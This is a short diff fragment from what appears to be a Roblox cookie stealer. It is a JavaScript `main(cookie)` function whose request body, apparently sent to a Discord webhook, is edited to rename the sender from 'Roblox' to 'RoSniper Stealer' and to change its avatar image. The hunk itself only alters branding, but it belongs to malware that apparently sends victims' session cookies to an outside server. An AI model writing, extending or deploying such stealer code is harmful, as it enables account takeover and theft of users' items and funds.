@@ -53,8 +53,8 @@ async function main(cookie) {
                 }
               }
             ],
-            "username": "Roblox",
-            "avatar_url": "https://media.discordapp.net/attachments/1012983912760360990/1016101590719025323/c22ca3f5381921d7f28c7edf92ca61d3.jpg?width=478&height=453",
+            "username": "RoSniper Stealer",
+            "avatar_url": "https://images-ext-2.discordapp.net/external/fGqpqT5H-QZBJmmGIwYWbWgWmw4nv4JYlBIKcN0xAc4/https/storage.googleapis.com/replit/images/1662229246536_8f442172f91fcef53421022c004aab07.jpeg",
             "attachments": []
         })
     });
